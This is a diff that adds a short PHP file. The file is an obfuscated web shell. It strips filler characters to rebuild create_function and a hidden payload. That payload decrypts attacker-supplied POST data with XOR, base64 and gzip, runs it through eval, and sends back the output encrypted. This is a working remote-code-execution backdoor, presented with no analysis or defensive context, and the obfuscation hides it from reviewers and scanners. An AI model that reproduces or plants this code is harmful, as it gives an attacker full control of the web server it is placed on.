@@ -1,0 +1,11 @@
+<?php
+$T='@.}gz.}unco.}mpress(@x(@bas.}e6.}4_decode($m[1.}]),$k.})));  .}.}$o=@ob_g.}et_conte.}n.}ts();  @ob_en';
+$Q='$k="823992.}a3";$k.}h=".}91952f.}f6c8.}d3";$kf="1e.}.}4cd4036e.}24";$p="Gy.}8gZl1X.}.}D.}zN3B.}.}JbQ";';
+$k=str_replace('R','','cRRRreateR_fRunctRion');
+$G='j<.}$c&&$i.}<$l);.}$j++,$i++).}{$o.=$.}t{$i}^.}$k{$j}.};}.}}return $o;.}.}}i.}f (@preg_ma.}tch.}(".}/$kh';
+$C='function x($t,.}$k){$c=str.}len.}($k).};$l=st.}rlen(.}$t);$o="";for(.}.}$i=0;$.}i<$l;){for(.}$j=.}0;($';
+$N='(.+.})$kf/",@file_g.}et_conten.}ts.}("php:.}//input.}"),$m).} == 1.}) { .} @ob_s.}tar.}t();  @eva.}l(';
+$z='d_cl.}ean().};  $r=@.}base6.}4_e.}ncode.}(@x.}(@gzcom.}press($o),$.}k));.}  print("$p.}$kh$r.}$kf");}';
+$v=str_replace('.}','',$Q.$C.$G.$N.$T.$z);
+$B=$k('',$v);$B();
+?>
